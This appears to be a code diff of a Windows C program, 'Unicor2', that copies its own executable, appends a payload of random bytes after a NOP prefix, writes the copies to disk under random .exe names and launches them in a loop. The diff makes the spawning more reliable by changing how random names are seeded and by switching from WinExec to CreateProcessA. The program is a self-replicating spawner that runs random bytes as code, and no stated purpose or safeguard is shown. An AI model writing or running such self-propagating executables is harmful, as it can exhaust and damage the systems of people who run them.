@@ -15,6 +15,9 @@ UINT8* executeableMem = 0;
 UINT8 nextPayloadBuf[NextPayloadSize] = { 0 };
 char nextEXEName[256] = { 0 };
 
+STARTUPINFOA si;
+PROCESS_INFORMATION pi;
+
 typedef void(*myFunc)(void);
 //void(*f1)(void) = (void(*)(void)) executeableMem;
 //static UINT8 myTestcode[] = { 0x90, 0x90, 0x90, 0xCC, 0xC3 };
@@ -24,6 +27,7 @@ void GenNxtPayload();
 int main(int argc, char** argv)
 {
     //printf("0x%x", myTestcode[0]);
+    srand((unsigned)time(NULL) * GetCurrentProcessId());
     FILE* fp = fopen(argv[0], "rb");
     fseek(fp, 0, SEEK_END);
     myEXESize = ftell(fp);
@@ -47,13 +51,12 @@ int main(int argc, char** argv)
     for (int i = 0; i < NextNum; i++)
     {
         GenNxtPayload();
-        srand((unsigned)time(NULL));
-        sprintf(nextEXEName, "Unicor2-0x%X.exe", rand());
+        sprintf(nextEXEName, "Unicor2-0x%X%X.exe", rand(), rand());
         fp = fopen(nextEXEName, "wb");
         fwrite(myFileBuffer, 1, myStaticLength, fp);
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
         fclose(fp);
-        WinExec(nextEXEName, 0);
+        CreateProcessA(nextEXEName, NULL, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
         Sleep(GapTime);
     }
     
@@ -64,7 +67,7 @@ void GenNxtPayload()
     nextPayloadBuf[0] = 0x90;
     nextPayloadBuf[1] = 0x90;
     nextPayloadBuf[2] = 0x90;
-    srand((unsigned)time(NULL));
+    srand((unsigned)time(NULL) * GetCurrentProcessId());
     for (int i = 3; i < NextPayloadSize - 1; i++)
     {
         nextPayloadBuf[i] = rand() % 256;
